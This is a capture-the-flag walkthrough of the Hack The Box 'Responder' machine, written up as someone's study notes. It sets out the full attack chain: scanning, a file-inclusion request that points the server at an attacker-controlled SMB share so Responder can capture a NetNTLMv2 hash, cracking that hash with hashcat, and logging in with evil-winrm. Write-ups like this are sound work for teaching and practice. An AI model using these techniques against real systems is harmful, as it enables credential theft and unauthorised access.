>[!tldr] Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the #Responder utility and the hash cracking tool #John_The_Ripper to obtain a cleartext password from an NTLM hash. Finally, the #Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.

# Adventure Mode
---
1. Start with a nmap scan 
	1. `nmap 10.129.95.234 -sT -p- --stats-every=5s`
	-> Ports `80,5985`
	2. `nmap 10.129.95.234 -sCV -p80,5985`
```shell
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
2. I first tried checking out the `http` site but got redirected to `http://unika.htb/` which didnt work. The fix is to add the machine IP to `/etc/hosts`. Next im going to run a automated pentest through `ZAP`. It found a critical flag which was `Path Traversal`
3. After learning this i decided to run `gobuster` to enumerate through. First just normal webpages, then if possible path traversal techniques.
	- `gobuster dir -k -u http://10.129.95.234/ -w Tools/SecLists-2026.1/Discovery/Web-Content/raft-small-directories.txt -x txt,php,html -t 40`
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
js                   (Status: 301) [Size: 335] [--> http://10.129.95.234/js/]
css                  (Status: 301) [Size: 336] [--> http://10.129.95.234/css/]
img                  (Status: 301) [Size: 336] [--> http://10.129.95.234/img/]
inc                  (Status: 301) [Size: 336] [--> http://10.129.95.234/inc/]
webalizer            (Status: 403) [Size: 421]
index.php            (Status: 200) [Size: 61]
phpmyadmin           (Status: 403) [Size: 421]
CSS                  (Status: 301) [Size: 336] [--> http://10.129.95.234/CSS/]
english.html         (Status: 200) [Size: 46453]
JS                   (Status: 301) [Size: 335] [--> http://10.129.95.234/JS/]
examples             (Status: 503) [Size: 402]
Js                   (Status: 301) [Size: 335] [--> http://10.129.95.234/Js/]
Css                  (Status: 301) [Size: 336] [--> http://10.129.95.234/Css/]
Inc                  (Status: 301) [Size: 336] [--> http://10.129.95.234/Inc/]
IMG                  (Status: 301) [Size: 336] [--> http://10.129.95.234/IMG/]
german.html          (Status: 200) [Size: 46984]
french.html          (Status: 200) [Size: 47199]
Img                  (Status: 301) [Size: 336] [--> http://10.129.95.234/Img/]
English.html         (Status: 200) [Size: 46453]
licenses             (Status: 403) [Size: 421]
server-status        (Status: 403) [Size: 421]
Index.php            (Status: 200) [Size: 61]
`French.html`          (Status: 200) [Size: 47199]
con                  (Status: 403) [Size: 302]
con.txt              (Status: 403) [Size: 302]
con.php              (Status: 403) [Size: 302]
con.html             (Status: 403) [Size: 302]
ENGLISH.html         (Status: 200) [Size: 46453]
German.html          (Status: 200) [Size: 46984]
INC                  (Status: 301) [Size: 336] [--> http://10.129.95.234/INC/]
aux.php              (Status: 403) [Size: 302]
aux.html             (Status: 403) [Size: 302]
aux                  (Status: 403) [Size: 302]
aux.txt              (Status: 403) [Size: 302]
Progress: 80460 / 80460 (100.00%)
===============================================================
```
- After testing a lot of these possible directories, `/INC` gave me a index! 
4. From here i decided to test Path Traversal. So i threw in a couple lists from seclist and got nothing...
5. I should look into the other service  on port `5985`. I know its related to microsoft but thats about it, lets research.
	- "Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP."
	- Source for more info: https://hackviser.com/tactics/pentesting/services/winrm
6. I am going to try `evil-winrm` which should be the exact tool i need. However, I had to work backwards to figure out what is happening. 
	1. We need a password or `NTLM-Hash` to use `evil-winrm`
	2. To capture a hash we can use `responder`
	3. For `responder` to work we need to get the target into making a connection back to our machine
7. So lets make `responder` listen, and try out different ways to make that reverse connection
	1. First I decided to try to get contact us to do some sort of ping back to my ip through SQLi but this failed
	2. I used Claude to ask how it would be possible, and i was informed to double check `index.php`. Here we can see it call `http://unika.htb/index.php?page=`. Thats our guy! We now need it to call back to my ip, but placing the IP inside here wont just work it has to be formatted for Windows, and specifically Windows Shares. The format would be `//<hostname>/<share>`. 
	- `http://unika.htb/index.php?page=//<ATTACKER_IP>/flag` -> Sent a request to my IP -> `responder` intercepts the NTLM hash!!!
```shell
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4b877e998906945f:269B5492F47B4A281F0686F6CCCCB7AB:010100000000000080069D4380F3DC01C423CC694550A5AE0000000002000800360033003700450001001E00570049004E002D00380045005A004700520055003500460052003600370004003400570049004E002D00380045005A00470052005500350046005200360037002E0036003300370045002E004C004F00430041004C000300140036003300370045002E004C004F00430041004C000500140036003300370045002E004C004F00430041004C000700080080069D4380F3DC0106000400020000000800300030000000000000000100000000200000666D2425B6C9DE329CD091A70191B3BF0C8A37C7B6EDE19862B938C6A45E8D9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000
```
8. Lets use `evil-winrm` now!
	- `evil-winrm -i target.com -u administrator -H 010100000000000080069D4380F3DC01C423CC694550A5AE0000000002000800360033003700450001001E00570049004E002D00380045005A004700520055003500460052003600370004003400570049004E002D00380045005A00470052005500350046005200360037002E0036003300370045002E004C004F00430041004C000300140036003300370045002E004C004F00430041004C000500140036003300370045002E004C004F00430041004C000700080080069D4380F3DC0106000400020000000800300030000000000000000100000000200000666D2425B6C9DE329CD091A70191B3BF0C8A37C7B6EDE19862B938C6A45E8D9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000`
	- ...ok so this isnt a NTLM its a *NetNTLMv2*. Which cant be used a Pass-the-hash attack... I have to crack it
9. Lets crack the `NetNTLMv2` with `hashcat`
	- `hashcat -m 5600 Downloads/crackme.txt Tools/SecLists-2026.1/Passwords/Cracked-Hashes/milw0rm-dictionary.txt`
	-> `badminton`
10. Great! We now have the password, lets FINALLY try `evil-winrm`
	- `evil-winrm-py -i 10.129.95.234 -u administrator -p badminton`
11. Now i will traverse through the directories and get the flag

*Edited for easier reading*
```
evil-winrm-py PS C:\Users\Administrator\Documents> Set-Location C:\Users
evil-winrm-py PS C:\Users> Get-ChildItem

    Directory: C:\Users
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

evil-winrm-py PS C:\Users> Set-Location mike
evil-winrm-py PS C:\Users\mike> Set-Location desktop
evil-winrm-py PS C:\Users\mike\desktop> Get-ChildItem


    Directory: C:\Users\mike\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


evil-winrm-py PS C:\Users\mike\desktop> type flag.txt
[REDACTED_FLAG]
```

- Flag -> `[REDACTED_FLAG]`
